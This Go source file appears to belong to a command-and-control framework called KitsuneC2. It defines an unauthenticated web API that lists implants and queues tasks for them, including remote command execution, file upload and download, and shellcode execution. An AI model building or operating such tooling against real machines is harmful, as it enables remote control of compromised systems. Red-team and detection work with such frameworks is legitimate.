package web

import (
	"KitsuneC2/server/api"
	"KitsuneC2/server/db"
	"log"
	"strconv"
	"strings"

	"github.com/gin-gonic/gin"
)

var taskTypeToHandlerFunc = map[int]func(c *gin.Context, implant string) error{
	5:  addImplantKill,
	7:  addChangeConfig,
	11: addFileInfo,
	13: addLs,
	15: addExec,
	17: addCd,
	19: addDownload,
	21: addUpload,
	23: addShellcodeExec,
}

func Init() {
	gin.SetMode(gin.DebugMode)
	router := gin.New()
	gin.LoggerWithWriter(log.Writer())

	router.GET("/implants", getImplants)
	router.GET("/tasks", getTasks)
	router.POST("/tasks/add", postAddTask)
	go router.Run("0.0.0.0:7331")
}

func getImplants(c *gin.Context) {
	implants, err := api.GetAllImplants()
	if err == db.ErrNoResults {
		emptyResp := make([]string, 0)
		c.JSON(200, emptyResp)
		return
	} else if err != nil {
		c.AbortWithStatusJSON(400, gin.H{"error": err.Error()})
		return
	}
	c.JSON(200, implants)
}

func getTasks(c *gin.Context) {
	completed := false
	paramAsStr := c.Request.URL.Query().Get("completed")
	if paramAsStr != "" {
		paramAsBool, err := strconv.ParseBool(paramAsStr)
		if err == nil {
			completed = paramAsBool
		}
	}
	tasks, err := api.GetAllTasks(completed)
	if err == db.ErrNoResults {
		emptyResp := make([]string, 0)
		c.JSON(200, emptyResp)
		return
	} else if err != nil {
		c.AbortWithStatusJSON(400, gin.H{"error": err.Error()})
		return
	}
	c.JSON(200, tasks)
}

func postAddTask(c *gin.Context) {
	taskTypeStr := c.PostForm("taskType")
	if taskTypeStr == "" {
		c.AbortWithStatusJSON(400, gin.H{"error": "taskType parameter should be a valid integer"})
		return
	}
	taskType, err := strconv.Atoi(taskTypeStr)
	if err != nil {
		c.AbortWithStatusJSON(400, gin.H{"error": err.Error()})
		return
	}

	implantsAsStr := c.PostForm("implants")
	implants := parseStringArray(implantsAsStr)
	if len(implants) == 0 {
		c.AbortWithStatusJSON(400, gin.H{"error": "at least 1 implant should be specified"})
		return
	}

	handlerFunc, ok := taskTypeToHandlerFunc[taskType]
	if !ok {
		c.AbortWithStatusJSON(400, gin.H{"error": "invalid task type"})
		return
	}

	var statuses = make(map[string]string)
	errEncountered := false
	for _, implantId := range implants {
		err = handlerFunc(c, implantId)
		if err != nil {
			statuses[implantId] = err.Error()
			errEncountered = true
		} else {
			statuses[implantId] = "success"
		}
	}

	if !errEncountered {
		c.JSON(200, gin.H{"success": true})
	} else {
		c.JSON(400, statuses)
	}
}

// given a string array as string e.g. ['string1', 'string2', ...]
// parses the string and returns array
// This function assumes string are written using single quotes
func parseStringArray(arr string) []string {
	parts := strings.Split(arr[1:len(arr)-1], ",")

	var stringsSlice []string
	for _, part := range parts {
		trimmedPart := strings.TrimSpace(strings.ReplaceAll(part, "'", ""))
		stringsSlice = append(stringsSlice, trimmedPart)
	}
	return stringsSlice
}
